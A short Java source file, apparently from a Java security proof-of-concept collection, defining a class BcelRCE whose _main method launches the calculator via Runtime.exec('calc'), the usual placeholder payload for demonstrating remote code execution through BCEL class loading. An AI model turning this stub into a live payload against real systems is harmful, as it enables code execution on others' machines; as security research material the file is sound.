package com.javasec.pocs.rce;

import java.io.IOException;

public class BcelRCE {
    public static void _main(String[] argv) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
    public static void main(String[] args) {

    }
}
